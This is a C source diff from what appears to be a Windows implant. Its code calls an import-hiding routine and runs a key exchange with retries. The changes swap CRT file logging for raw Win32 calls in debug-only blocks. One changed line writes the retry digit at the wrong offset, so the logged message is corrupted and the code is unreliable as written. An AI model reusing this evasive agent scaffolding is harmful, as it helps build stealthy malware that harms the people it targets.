@@ -796,15 +796,21 @@ void agent_run(AgentState *state) {
 int main(void) {
     AgentState state;
 
-    /* ── EARLY DIAGNOSTIC — uses CRT fopen, no dependencies ── */
+    /*
+     * ── EARLY DIAGNOSTIC — Pure Win32 APIs only, ZERO CRT dependency ──
+     * -Wl,-e,main skips CRT init, so fopen/fprintf don't work.
+     * Use CreateFileA/WriteFile directly — these are IAT imports
+     * resolved by the Windows PE loader before entry point is called.
+     */
 #if CONFIG_DEBUG
     {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) {
-            fprintf(_ef, "[early] main() entered, PID=%lu\r\n",
-                    (unsigned long)GetCurrentProcessId());
-            fflush(_ef);
-            fclose(_ef);
+        HANDLE _eh = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
+            FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (_eh != INVALID_HANDLE_VALUE) {
+            DWORD _ew;
+            WriteFile(_eh, "[early] main() entered\r\n", 24, &_ew, NULL);
+            CloseHandle(_eh);
         }
     }
 #endif
@@ -816,10 +822,13 @@ int main(void) {
     if (!iat_hide_init()) {
 #if CONFIG_DEBUG
         {
-            FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-            if (_ef) {
-                fprintf(_ef, "[early] iat_hide_init() FAILED\r\n");
-                fflush(_ef); fclose(_ef);
+            HANDLE _eh = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
+                FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (_eh != INVALID_HANDLE_VALUE) {
+                DWORD _ew;
+                WriteFile(_eh, "[early] iat_hide_init FAILED\r\n", 30, &_ew, NULL);
+                CloseHandle(_eh);
             }
         }
 #endif
@@ -828,37 +837,36 @@ int main(void) {
 
 #if CONFIG_DEBUG
     {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) {
-            fprintf(_ef, "[early] iat_hide_init() OK\r\n");
-            fflush(_ef); fclose(_ef);
+        HANDLE _eh = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
+            FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (_eh != INVALID_HANDLE_VALUE) {
+            DWORD _ew;
+            WriteFile(_eh, "[early] iat_hide_init OK\r\n", 26, &_ew, NULL);
+
+            /* Show where %TEMP% points */
+            char _tmpbuf[MAX_PATH] = {0};
+            DWORD _tlen = GetTempPathA(MAX_PATH - 20, _tmpbuf);
+            WriteFile(_eh, "[early] TEMP=", 13, &_ew, NULL);
+            WriteFile(_eh, _tmpbuf, _tlen, &_ew, NULL);
+            WriteFile(_eh, "\r\n", 2, &_ew, NULL);
+            CloseHandle(_eh);
         }
     }
 #endif
 
     DBG("[main] agent starting, PID=%u", GetCurrentProcessId());
 
-#if CONFIG_DEBUG
-    {
-        /* Check where DBG thinks the log file is */
-        char _tmpbuf[MAX_PATH] = {0};
-        DWORD _tlen = GetTempPathA(MAX_PATH - 20, _tmpbuf);
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) {
-            fprintf(_ef, "[early] GetTempPathA returned: '%s' (len=%lu)\r\n",
-                    _tmpbuf, (unsigned long)_tlen);
-            fflush(_ef); fclose(_ef);
-        }
-    }
-#endif
-
     if (!agent_init(&state)) {
 #if CONFIG_DEBUG
         {
-            FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-            if (_ef) {
-                fprintf(_ef, "[early] agent_init() FAILED\r\n");
-                fflush(_ef); fclose(_ef);
+            HANDLE _eh = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
+                FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (_eh != INVALID_HANDLE_VALUE) {
+                DWORD _ew;
+                WriteFile(_eh, "[early] agent_init FAILED\r\n", 27, &_ew, NULL);
+                CloseHandle(_eh);
             }
         }
 #endif
@@ -870,10 +878,13 @@ int main(void) {
     /* Key exchange with retry */
 #if CONFIG_DEBUG
     {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) {
-            fprintf(_ef, "[early] agent_init() OK, starting key exchange\r\n");
-            fflush(_ef); fclose(_ef);
+        HANDLE _eh = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
+            FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (_eh != INVALID_HANDLE_VALUE) {
+            DWORD _ew;
+            WriteFile(_eh, "[early] starting key exchange\r\n", 31, &_ew, NULL);
+            CloseHandle(_eh);
         }
     }
 #endif
@@ -884,10 +895,15 @@ int main(void) {
         DBG("[main] key exchange attempt %d FAILED", retries);
 #if CONFIG_DEBUG
         {
-            FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-            if (_ef) {
-                fprintf(_ef, "[early] key exchange attempt %d FAILED\r\n", retries);
-                fflush(_ef); fclose(_ef);
+            HANDLE _eh = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
+                FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (_eh != INVALID_HANDLE_VALUE) {
+                DWORD _ew;
+                char _msg[] = "[early] key exchange attempt X FAILED\r\n";
+                _msg[32] = '0' + (char)(retries % 10);
+                WriteFile(_eh, _msg, sizeof(_msg) - 1, &_ew, NULL);
+                CloseHandle(_eh);
             }
         }
 #endif
